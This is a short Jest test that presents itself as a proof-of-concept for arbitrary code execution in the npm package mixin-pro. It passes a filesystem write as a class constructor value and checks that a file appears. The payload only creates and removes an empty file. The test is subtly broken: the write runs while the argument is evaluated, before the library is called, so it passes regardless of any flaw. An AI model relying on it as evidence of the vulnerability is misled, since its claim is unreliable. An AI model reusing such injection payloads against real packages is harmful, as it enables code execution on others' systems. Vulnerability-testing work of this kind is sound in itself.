test("Arbitrary code execution in mixin-pro", () => {
  expect.assertions(2);
  const fs = require("fs");
  const Class = require("mixin-pro").createClass;
  const path = "./mixin-pro";
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    let Bar1 = Class({
      constructor: require(`fs`).writeFileSync("mixin-pro", ``),
    });
  } catch (error) {}
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
